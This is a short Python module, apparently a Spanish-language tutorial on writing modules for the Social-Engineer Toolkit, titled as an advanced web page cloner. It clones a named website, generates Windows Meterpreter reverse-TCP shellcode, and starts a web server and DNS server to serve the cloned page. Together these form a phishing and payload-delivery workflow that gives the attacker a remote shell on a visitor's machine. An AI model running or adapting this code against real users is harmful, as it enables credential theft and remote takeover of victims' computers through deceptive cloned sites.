#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                        DESARROLLANDO MODULOS EN SET

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

"""""""""""""""""""""""""""""""""""""""""""""""""""
        CLONADOR DE PÁGINAS WEB
"""""""""""""""""""""""""""""""""""""""""""""""""""

import sys
from src.core.setcore import *

MAIN=" Clonador de páginas web avanzado "
AUTHOR=" Juan Velasco Gómez"

def main():

    print("\n")
    print("**********************************************************")
    print(" Clonar un sitio y iniciar un servidor web com metasploit ")
    print("**********************************************************")
    print("\n")

    site_cloner("http://fwhibbit.github.io/","thw/","")

    print (check_os())
    print (meta_path())
    print (meta_database())

    ipAddress = grab_ipaddress()
    valid = is_valid_ip(ipAddress)

    if valid:
        print ("La dirección ip " + ipAddress + " es válida")

    generate_shellcode("windows/meterpreter/reverse_tcp")
    print (generate_random_string(1,35))
    start_web_server("thw/")
    start_dns()
